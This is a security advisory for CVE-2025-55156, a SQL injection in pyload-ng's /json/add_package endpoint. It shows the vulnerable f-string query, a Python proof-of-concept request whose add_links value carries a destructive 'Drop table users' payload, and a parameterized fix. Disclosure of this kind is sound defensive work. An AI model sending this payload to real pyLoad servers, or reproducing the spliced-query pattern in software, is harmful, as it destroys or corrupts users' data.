# [H] PyLoad vulnerable to SQL Injection via API /json/add_package in add_links parameter

## Summary
Severity: High
Advisory: GHSA-pwh4-6r3m-j2rf
CVE: CVE-2025-55156
CWE: CWE-89
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-08-12
Source: https://github.com/advisories/GHSA-pwh4-6r3m-j2rf
Type: github-advisory

## Affected
- PyPI: `pyload-ng` — affected >=0 <0.5.0b3.dev91

## Details
### Summary
The parameter `add_links` in the API /json/add_package is vulnerable to SQL Injection. SQL injection vulnerabilities can lead to sensitive data leakage.

### Details
- Affected file：https://github.com/pyload/pyload/blob/develop/src/pyload/core/database/file_database.py#L271
- Affected code:
```python
@style.queue
    def update_link_info(self, data):
        """
        data is list of tuples (name, size, status, url)
        """
        self.c.executemany(
            "UPDATE links SET name=?, size=?, status=? WHERE url=? AND status IN (1,2,3,14)",
            data,
        )
        ids = []
        statuses = "','".join(x[3] for x in data)
        self.c.execute(f"SELECT id FROM links WHERE url IN ('{statuses}')")
        for r in self.c:
            ids.append(int(r[0]))
        return ids
````
statuses is constructed from data, and data is the value of the add_links parameter entered by the user through /json/add_packge. Because `{statuses}` is directly spliced into the SQL statement, it leads to the SQL injection vulnerability.

- Vulnerability Chain
```xml
josn_blueprint.py#add_package
src/pyload/core/api/__init__.py#add_package
src/pyload/core/managers/file_manager.py#add_links
src/pyload/core/threads/info_thread.py#run
src/pyload/core/threads/info_thread.py#update_info
src/pyload/core/managers/file_manager.py#update_file_info
src/pyload/core/database/file_database.py#update_link_info
```


### PoC
```python
import requests


if __name__ == "__main__":
    url = "http://localhost:8000/json/add_package"
    data = {
        "add_name": "My Downloads1",
        "add_dest": "0",
        "add_links": "https://www.dailymotion.com/video/x8zzzzz') or 1; Drop table users;--",
        "add_password": "mypassword"
    }

    response = requests.post(url, cookies=your_cookies, data=data)
    print(response.status_code, response.text)
```
<img width="1599" height="827" alt="image" src="https://github.com/user-attachments/assets/9bdcef37-59b8-4e60-a2b5-beb8a88c3202" />




### Remediation
 ```python
def update_link_info(self, data):
    """
data is list of tuples (name, size, status, url)
"""
    self.c.executemany(
        "UPDATE links SET name=?, size=?, status=? WHERE url=? AND status IN (1,2,3,14)",
        data,
    )
    
    # 提取所有url
    urls = [x[3] for x in data]
    
    # 构建参数化查询，避免SQL注入
    placeholders = ','.join(['?'] * len(urls))
    query = f"SELECT id FROM links WHERE url IN ({placeholders}) AND status IN (1,2,3,14)"
    self.c.execute(query, urls)
    
    ids = [int(row[0]) for row in self.c.fetchall()]
    return ids
```



### Impact
Attackers can modify or delete data in the database, causing data errors or loss.

## References
- https://github.com/pyload/pyload/security/advisories/GHSA-pwh4-6r3m-j2rf
- https://nvd.nist.gov/vuln/detail/CVE-2025-55156
- https://github.com/pyload/pyload/commit/134edcdf6e2a10c393743c254da3d9d90b74258f
- https://github.com/pyload/pyload
- https://github.com/pyload/pyload/blob/develop/src/pyload/core/database/file_database.py#L271
